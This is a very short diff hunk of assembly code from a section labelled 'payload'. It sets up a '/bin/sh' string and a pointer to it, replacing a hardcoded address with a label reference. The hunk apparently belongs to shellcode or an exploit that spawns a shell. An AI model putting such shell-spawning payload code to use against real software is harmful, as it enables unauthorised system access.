@@ -37,7 +37,7 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-        dq      400519h
+        .QWORD  file_to_run
         .ascii  "\0\0\0\0\0\0\0\0"
 
 callptr:
